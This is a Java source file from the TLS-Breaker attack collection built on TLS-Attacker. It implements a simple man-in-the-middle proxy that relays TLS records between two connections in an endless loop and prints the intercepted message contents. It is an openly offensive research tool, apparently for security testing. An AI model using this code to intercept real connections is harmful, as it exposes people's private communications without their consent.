/**
 * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
 *
 * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
 *
 * Licensed under Apache License, Version 2.0
 * http://www.apache.org/licenses/LICENSE-2.0.txt
 */

package de.rub.nds.tlsbreaker.simplemitmproxy.impl;

import de.rub.nds.tlsbreaker.breakercommons.impl.Attacker;
import de.rub.nds.tlsbreaker.simplemitmproxy.config.SimpleMitmProxyCommandConfig;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import org.apache.commons.codec.binary.Hex;

import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.RunningModeType;
import de.rub.nds.tlsattacker.core.protocol.Preparator;
import de.rub.nds.tlsattacker.core.protocol.ProtocolMessage;
import de.rub.nds.tlsattacker.core.protocol.message.ApplicationMessage;
import de.rub.nds.tlsattacker.core.record.AbstractRecord;
import de.rub.nds.tlsattacker.core.record.Record;
import de.rub.nds.tlsattacker.core.record.parser.RecordParser;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutorFactory;
import de.rub.nds.tlsattacker.core.workflow.action.ForwardMessagesAction;
import de.rub.nds.tlsattacker.core.workflow.action.executor.MessageActionResult;
import de.rub.nds.tlsattacker.core.workflow.action.executor.ReceiveMessageHelper;
import de.rub.nds.tlsattacker.core.workflow.action.executor.SendMessageHelper;
import de.rub.nds.tlsattacker.core.workflow.action.executor.WorkflowExecutorType;
import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
import de.rub.nds.tlsattacker.transport.TransportHandler;

/**
 *
 */
public class SimpleMitmProxy extends Attacker<SimpleMitmProxyCommandConfig> {

    /**
     *
     * @param config
     * @param baseConfig
     */
    public SimpleMitmProxy(SimpleMitmProxyCommandConfig config, Config baseConfig) {
        super(config, baseConfig);
    }

    @Override
    public void executeAttack() {
        Config conf = config.createConfig();
        conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
        conf.setDefaultRunningMode(RunningModeType.MITM);
        conf.setWorkflowExecutorShouldClose(false);

        State state = new State(conf);

        WorkflowExecutor workflowExecutor =
            WorkflowExecutorFactory.createWorkflowExecutor(WorkflowExecutorType.DEFAULT, state);
        workflowExecutor.executeWorkflow();

        // state.getInboundTlsContexts().get(0).

        ReceiveMessageHelper receiveMessageHelper = new ReceiveMessageHelper();
        SendMessageHelper sendMessageHelper = new SendMessageHelper();
        while (true) {
            try {
                // System.out.println(inboundHandler);

                MessageActionResult mar = receiveMessageHelper.receiveMessages(state.getInboundTlsContexts().get(0));

                for(ProtocolMessage message:mar.getMessageList()){
                    System.out.println(message.getCompleteResultingMessage());
                }

                sendMessageHelper.sendRecords(mar.getRecordList(), state.getOutboundTlsContexts().get(0));

            } catch (Exception e) {
                System.out.println("No data yet");
                e.printStackTrace();
            }
        }
    }

    /**
     *
     * @return
     */
    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not supported yet.");
    }
}
